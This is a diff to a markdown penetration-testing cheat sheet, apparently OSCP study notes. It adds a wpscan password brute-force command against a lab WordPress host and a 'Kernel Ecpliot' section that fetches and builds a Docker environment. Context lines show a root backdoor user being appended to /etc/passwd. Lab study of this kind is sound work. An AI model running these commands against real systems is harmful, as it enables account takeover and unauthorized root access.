@@ -86,6 +86,7 @@
   - [Linux](#linux-3)
     - [SUGGEST](#suggest)
     - [/etc/passwd](#etcpasswd)
+    - [Kernel Ecpliot](#kernel-ecpliot)
 - [Transfer](#transfer)
   - [Port Forwading](#port-forwading)
     - [SSH](#ssh)
@@ -223,6 +224,8 @@ comm -23 <(sort /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-med
 ```bash
 wpscan --url http://192.168.198.244 --enumerate u
 wpscan --url http://192.168.198.244 --enumerate p --plugins-detection aggressive  --plugins-version-detection  aggressive
+
+wpscan --url http://192.168.169.121/wordpress/ -U 'loly' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
 ```
 
 ### endpoint
@@ -990,6 +993,14 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 joe@debian-privesc:~$ openssl passwd w00t
 Fdzt.eqJQ4s0g
 joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
+### Kernel Ecpliot
+```bash
+# Environment
+wget https://github.com/schecthellraiser606/oscp_cheet/raw/main/Dockerfile
+docker build -t vuln .
+docker run -v /root/work/:/work -it vuln /bin/bash
 ```
 
 # Transfer
